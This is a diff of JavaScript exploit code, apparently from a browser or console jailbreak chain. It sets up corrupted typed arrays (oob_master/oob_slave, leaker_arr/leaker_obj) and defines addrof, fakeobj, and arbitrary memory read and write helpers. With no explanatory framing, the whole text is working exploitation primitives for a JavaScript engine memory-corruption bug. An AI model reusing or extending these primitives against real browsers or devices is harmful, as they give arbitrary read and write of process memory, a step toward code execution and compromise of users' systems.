@@ -1,33 +1,40 @@
-function i48_put(x, a)
+var oob_master = new Uint32Array(1024);
+var oob_slave = new Uint8Array(1024);
+var leaker_arr = new Uint32Array(1024);
+var leaker_obj = {a: 1234};
+write64(addrof(oob_master).add(16), addrof(oob_slave));
+write64(addrof(leaker_arr).add(16), addrof(leaker_obj));
+
+var i48_put = function(x, a)
 {
     a[4] = x | 0;
     a[5] = (x / 4294967296) | 0;
 }
 
-function i48_get(a)
+var i48_get = function(a)
 {
     return a[4] + a[5] * 4294967296;
 }
 
-function addrof(x)
+var addrof = function(x)
 {
     leaker_obj.a = x;
     return i48_get(leaker_arr);
 }
 
-function fakeobj(x)
+var fakeobj = function(x)
 {
     i48_put(x, leaker_arr);
     return leaker_obj.a;
 }
 
-function read_mem_setup(p, sz)
+var read_mem_setup = function(p, sz)
 {
     i48_put(p, oob_master);
     oob_master[6] = sz;
 }
 
-function read_mem(p, sz)
+var read_mem = function(p, sz)
 {
     read_mem_setup(p, sz);
     var arr = [];
@@ -36,13 +43,13 @@ function read_mem(p, sz)
     return arr;
 }
 
-function read_mem_s(p, sz)
+var read_mem_s = function(p, sz)
 {
     read_mem_setup(p, sz);
     return ""+oob_slave;
 }
 
-function read_mem_b(p, sz)
+var read_mem_b = function(p, sz)
 {
     read_mem_setup(p, sz);
     var b = new Uint8Array(sz);
@@ -50,7 +57,7 @@ function read_mem_b(p, sz)
     return b;
 }
 
-function read_mem_as_string(p, sz)
+var read_mem_as_string = function(p, sz)
 {
     var x = read_mem_b(p, sz);
     var ans = '';
@@ -59,7 +66,7 @@ function read_mem_as_string(p, sz)
     return ans;
 }
 
-function write_mem(p, data)
+var write_mem = function(p, data)
 {
     i48_put(p, oob_master);
     oob_master[6] = data.length;
@@ -67,7 +74,7 @@ function write_mem(p, data)
         oob_slave[i] = data[i];
 }
 
-function read_ptr_at(p)
+var read_ptr_at = function(p)
 {
     var ans = 0;
     var d = read_mem(p, 8);
@@ -76,7 +83,7 @@ function read_ptr_at(p)
     return ans;
 }
 
-function write_ptr_at(p, d)
+var write_ptr_at = function(p, d)
 {
     var arr = [];
     for(var i = 0; i < 8; i++)
@@ -87,7 +94,7 @@ function write_ptr_at(p, d)
     write_mem(p, arr);
 }
 
-function hex(x)
+var hex = function(x)
 {
     return (new Number(x)).toString(16);
 }
